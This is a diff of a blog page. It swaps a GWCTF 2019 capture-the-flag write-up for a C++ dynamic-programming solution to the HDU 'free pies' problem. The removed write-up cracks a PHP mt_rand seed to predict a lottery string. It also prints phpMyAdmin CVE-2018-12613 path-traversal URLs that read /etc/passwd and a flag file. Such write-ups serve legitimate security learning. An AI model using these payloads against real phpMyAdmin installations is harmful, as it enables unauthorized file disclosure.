@@ -47,23 +47,20 @@
     sidebarPadding: 40
   };
 </script>
-  <meta name="description" content="GWCTF-2019之前比赛没做出来，我真是弟弟!">
-<meta name="keywords" content="PHP">
+  <meta name="description" content="题目都说天上不会掉馅饼，但有一天gameboy正走在回家的小径上，忽然天上掉下大把大把的馅饼。说来gameboy的人品实在是太好了，这馅饼别处都不掉，就掉落在他身旁的10米范围内。馅饼如果掉在了地上当然就不能吃了，所以gameboy马上卸下身上的背包去接。但由于小径两侧都不能站人，所以他只能在小径上接。由于gameboy平时老呆在房间里玩游戏，虽然在游戏中是个身手敏捷的高手，但在现实中运动神经特别">
+<meta name="keywords" content="C++">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GWCTF 2019WP-复现">
-<meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;index.html">
+<meta property="og:title" content="HDU免费馅饼(DP)">
+<meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC&#x2F;index.html">
 <meta property="og:site_name" content="Chen&#39;Blog">
-<meta property="og:description" content="GWCTF-2019之前比赛没做出来，我真是弟弟!">
+<meta property="og:description" content="题目都说天上不会掉馅饼，但有一天gameboy正走在回家的小径上，忽然天上掉下大把大把的馅饼。说来gameboy的人品实在是太好了，这馅饼别处都不掉，就掉落在他身旁的10米范围内。馅饼如果掉在了地上当然就不能吃了，所以gameboy马上卸下身上的背包去接。但由于小径两侧都不能站人，所以他只能在小径上接。由于gameboy平时老呆在房间里玩游戏，虽然在游戏中是个身手敏捷的高手，但在现实中运动神经特别">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;1.jpg">
-<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;2.jpg">
-<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;3.jpg">
-<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;4.jpg">
-<meta property="og:updated_time" content="2020-02-08T07:53:22.924Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC&#x2F;1.jpg">
+<meta property="og:updated_time" content="2020-03-07T10:26:35.927Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;GWCTF-2019-WP&#x2F;1.jpg">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC&#x2F;1.jpg">
 
-<link rel="canonical" href="https://chenzidu.github.io/2020/02/08/GWCTF-2019-WP/">
+<link rel="canonical" href="https://chenzidu.github.io/2020/03/07/%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC/">
 
 
 <script id="page-configurations">
@@ -77,7 +74,7 @@
   };
 </script>
 
-  <title>GWCTF 2019WP-复现 | Chen'Blog</title>
+  <title>HDU免费馅饼(DP) | Chen'Blog</title>
   
 
 
@@ -222,7 +219,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/02/08/GWCTF-2019-WP/">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/03/07/%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -235,7 +232,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          GWCTF 2019WP-复现
+          HDU免费馅饼(DP)
         </h1>
 
         <div class="post-meta">
@@ -246,7 +243,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-08 10:38:44 / 修改时间：15:53:22" itemprop="dateCreated datePublished" datetime="2020-02-08T10:38:44+08:00">2020-02-08</time>
+              <time title="创建时间：2020-03-07 18:16:06 / 修改时间：18:26:35" itemprop="dateCreated datePublished" datetime="2020-03-07T18:16:06+08:00">2020-03-07</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,8 +251,8 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
+                  <a href="/categories/%E6%97%A5%E5%B8%B8%E8%AE%AD%E7%BB%83/" itemprop="url" rel="index">
+                    <span itemprop="name">日常训练</span>
                   </a>
                 </span>
             </span>
@@ -268,7 +265,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">525(字)</span>
+           <span class="post-count">714(字)</span>
            
          </span>
 	  
@@ -278,7 +275,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">阅读时长:</span>
-           <span class="post-count">2(分)</span>
+           <span class="post-count">3(分)</span>
            
         </span>
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -298,29 +295,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>GWCTF-2019之前比赛没做出来，我真是弟弟!</p>
+        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>都说天上不会掉馅饼，但有一天gameboy正走在回家的小径上，忽然天上掉下大把大把的馅饼。说来gameboy的人品实在是太好了，这馅饼别处都不掉，就掉落在他身旁的10米范围内。馅饼如果掉在了地上当然就不能吃了，所以gameboy马上卸下身上的背包去接。但由于小径两侧都不能站人，所以他只能在小径上接。由于gameboy平时老呆在房间里玩游戏，虽然在游戏中是个身手敏捷的高手，但在现实中运动神经特别迟钝，每秒种只有在移动不超过一米的范围内接住坠落的馅饼。现在给这条小径如图标上坐标：<br><img src="1.jpg" alt=""><br>为了使问题简化，假设在接下来的一段时间里，馅饼都掉落在0-10这11个位置。开始时gameboy站在5这个位置，因此在第一秒，他只能接到4,5,6这三个位置中其中一个位置上的馅饼。问gameboy最多可能接到多少个馅饼？（假设他的背包可以容纳无穷多个馅饼）</p>
 <a id="more"></a>
-<h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p><img src="1.jpg" alt=""><br>要求我们猜出后十位，查看网页源码，发现js指向check.php。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">8y6CBQcJaW</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">#这不是抽奖程序的源代码！不许看！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">session_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$str&#x3D;&#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">$len1&#x3D;20;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">$str_show &#x3D; substr($str, 0, 10);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">show_source(&quot;check.php&quot;);</span></pre></td></tr></table></figure>
-<p>借鉴<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">wonderkun</a>这位大佬写的</p>
-<p>private key，来猜测public key</p>
-<p>首先把他给的十位数放到这个脚本里：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">str2&#x3D;&#39;8y6CBQcJaW&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">str3 &#x3D; str1[::-1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">length &#x3D; len(str2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">res&#x3D;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for i in range(len(str2)):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    for j in range(len(str1)):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            break</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">print(res)</span></pre></td></tr></table></figure>
-<p><img src="2.jpg" alt=""></p>
-<p>之后再利用<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a>这个脚本，破解seed</p>
-<p>php_mt_seed，要先make，php_mt_seed.C生成php_mt_seed文件，再使用。具体语句Readme里面有。</p>
-<p><img src="3.jpg" alt=""></p>
-<p>得到seed</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">mt_srand(342457593);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$str &#x3D; &#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$len1 &#x3D; 20;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span></pre></td></tr></table></figure>
-
-<p><img src="4.jpg" alt=""></p>
-<p>得到字符。</p>
-<p><a href="https://www.suk1.top/" target="_blank" rel="noopener">感谢晓黑老哥</a>，之前php用的是5.3版本，忘记改了，记得要改成7.1及以上。</p>
-<h2 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h2><p>发现phpMyAdmin,可以利用现成poc直接打。</p>
-<p><code>http://ip:port/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../etc/passwd</code></p>
-<p>发现可以用，试试flag</p>
-<p><code>?target=db_datadict.php%253f/../../../../../../../../flag</code></p>
-<p><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">参考：cve-2018-12613-PhpMyadmin后台文件包含</a></p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入数据有多组。每组数据的第一行为以正整数n<code>(0&lt;n&lt;100000)</code>，表示有n个馅饼掉在这条小径上。在结下来的n行中，每行有两个整数x,T<code>(0&lt;T&lt;100000)</code>,表示在第T秒有一个馅饼掉在x点上。同一秒钟在同一点上可能掉下多个馅饼。n=0时输入结束。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每一组输入数据对应一行输出。输出一个整数m，表示gameboy最多可能接到m个馅饼。 提示：本题的输入数据量比较大，建议用scanf读入，用cin可能会超时。</p>
+<h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">6</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">5 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">4 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">6 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">7 2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">7 2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">8 3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">0</span></pre></td></tr></table></figure>
+<h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><p>4</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote class="blockquote-center"><p>状态转移方程：dp[i][j]+=max(dp[i+1][j],max(dp[i+1][j-1],dp[i+1][j+1]));//检查左边，中间，右边<br>从最后两秒开始找，最后到5这个起点</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">using namespace std;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">int dp[100010][15];&#x2F;&#x2F;第一个存时间，第二个存位置 </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">int main()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	int n,t,a,b; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	while(scanf(&quot;%d&quot;,&amp;n)!&#x3D;EOF&amp;&amp;n)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">		memset(dp,0,sizeof(dp));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">		int num&#x3D;0;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">		for(int i&#x3D;0;i&lt;n;i++)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">			scanf(&quot;%d %d&quot;,&amp;a,&amp;b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">			dp[b][a+1]++;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">			num&#x3D;max(num,b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">		for(int i&#x3D;num-1;i&gt;&#x3D;0;i--)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">			for(int j&#x3D;1;j&lt;&#x3D;11;j++)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">				dp[i][j]+&#x3D;max(dp[i+1][j],max(dp[i+1][j-1],dp[i+1][j+1]));&#x2F;&#x2F;左边，中间，右边 </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">		printf(&quot;%d\n&quot;,dp[0][6]);	&#x2F;&#x2F;5为起始点 </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	&#125; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">	return 0;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
 
     </div>
 
@@ -330,7 +313,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/C/" rel="tag"># C++</a>
           </div>
 
         
@@ -339,13 +322,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/02/06/pta-7-52-%E6%B1%82%E8%A7%A3%E8%BF%B7%E5%AE%AB%E4%BB%8E%E5%85%A5%E5%8F%A3%E5%88%B0%E5%87%BA%E5%8F%A3%E7%9A%84%E6%89%80%E6%9C%89%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/" rel="prev" title="pta-7-52 求解迷宫从入口到出口的所有最短路径(DFS)">
-      <i class="fa fa-chevron-left"></i> pta-7-52 求解迷宫从入口到出口的所有最短路径(DFS)
+    <a href="/2020/03/06/HDU%E6%95%B0%E5%A1%94%E9%97%AE%E9%A2%98-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92DP/" rel="prev" title="数塔问题-动态规划DP">
+      <i class="fa fa-chevron-left"></i> 数塔问题-动态规划DP
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/02/10/7-48-%E6%B7%B1%E5%85%A5%E8%99%8E%E7%A9%B4-25%E5%88%86/" rel="next" title="7-48 深入虎穴 (25分)(DFS)">
-      7-48 深入虎穴 (25分)(DFS) <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -383,7 +363,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#枯燥的抽奖"><span class="nav-number">1.</span> <span class="nav-text">枯燥的抽奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我有一个数据库"><span class="nav-number">2.</span> <span class="nav-text">我有一个数据库</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输入格式"><span class="nav-number">2.</span> <span class="nav-text">输入格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出格式"><span class="nav-number">3.</span> <span class="nav-text">输出格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#样例输入"><span class="nav-number">4.</span> <span class="nav-text">样例输入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#样例输出"><span class="nav-number">5.</span> <span class="nav-text">样例输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码"><span class="nav-number">6.</span> <span class="nav-text">代码</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
